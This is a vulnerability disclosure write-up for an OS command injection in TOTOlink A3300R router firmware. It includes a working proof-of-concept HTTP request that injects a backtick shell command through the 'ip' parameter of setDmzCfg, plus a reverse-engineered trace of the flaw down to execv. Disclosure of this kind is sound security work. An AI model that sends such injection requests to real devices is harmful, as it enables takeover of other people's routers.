# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection
### Discoverer
Yangyi
## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/3/img/image-20240109124617070.png)

## Vulnerability Description

When deal with  `setDmzCfg` request,`ip` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=F30C610BF2E2EC8B HTTP/1.1
Host: itotolink.net
Content-Length: 75
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://itotolink.net
Referer: http://itotolink.net/advance/dmz.html?token=F30C610BF2E2EC8B
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"enable":"1","ip":"192.168.0.205`ls>/web/456.txt`","topicurl":"setDmzCfg"}
```

injection the command "ls>/web/456.txt"

![image-20240109132224609](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/4/img/image-20240109132224609.png)

check the result.

```
GET /456.txt HTTP/1.1
Host: itotolink.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://itotolink.net/advance/dmz.html?token=F30C610BF2E2EC8B
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
```

![image-20240109132231143](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/4/img/image-20240109132231143.png)

## Analysis

sub_41B368 will handle the `setDmzCfg` request. sub_41B368 get `ip` parameter from request body, then pass to `Uci_Set_Str` function.

![image-20240109132128999](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/4/img/image-20240109132128999.png)

`Uci_Set_Str` function Splicing uci command, and pass to `CsteSystem` function.

![image-20240109131204077](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/3/img/image-20240109131204077.png)

`CsteSystem` wraps the command and then passes it to `execv` to execute the command.

![image-20240109131330610](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/3/img/image-20240109131330610.png)
